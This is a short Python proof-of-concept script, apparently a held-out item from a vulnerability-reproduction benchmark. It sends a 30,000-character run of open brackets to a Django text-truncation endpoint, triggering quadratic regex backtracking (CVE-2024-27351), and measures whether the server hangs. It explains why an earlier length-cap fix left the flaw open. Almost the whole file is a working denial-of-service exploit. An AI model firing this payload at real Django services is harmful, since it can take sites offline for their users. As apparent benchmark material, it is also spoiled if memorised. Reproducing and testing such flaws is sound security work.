#!/usr/bin/env python3
"""[HELD-OUT] bypass_poc — CVE-2024-27351 residual exploit, delivered over EXTERNAL HTTP.

POSTs the CVE-2024-27351 catastrophic input to the REAL Django truncation service
(POST /truncate -> Truncator(text).words(30, html=True)) and measures the server-side response
latency. The payload is a 30,000 open-bracket run that sits ENTIRELY WITHIN Django 4.2.6's
MAX_LENGTH_HTML=5,000,000 input cap, so the CVE-2023-43665 truncation never triggers and the
UNCHANGED re_words regex `<[^>]+?>|([^<>\\s]+)` still backtracks O(n^2) on the bracket run --
the CVE-2023-43665 fix is INCOMPLETE (it sanitized input LENGTH, not the quadratic regex).

Expected: SLOW (response hangs -> HTTP timeout) on V1 (4.2.6, TARGET); FAST on V2 (4.2.11), where
CVE-2024-27351 replaced re_words with the linear WordsRegex scanner (uses str.find('>') to close a
tag instead of a backtracking quantifier). Also slow on V0 (4.2.5), whose regex is identical.

Usage: bypass_poc.py http://127.0.0.1:29141
"""
import http.client
import socket
import sys
import time

PAYLOAD = "<" * 30_000   # len 30,000 (within the 5M cap; same shape as Django's test '<'*60000)
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = PAYLOAD.encode("utf-8")
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/truncate", body=body,
                  headers={"Content-Type": "text/plain; charset=utf-8",
                           "Content-Length": str(len(body))})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    import json
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:29141"
    out = run(base)
    print(json.dumps({"poc": "residual/CVE-2024-27351", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
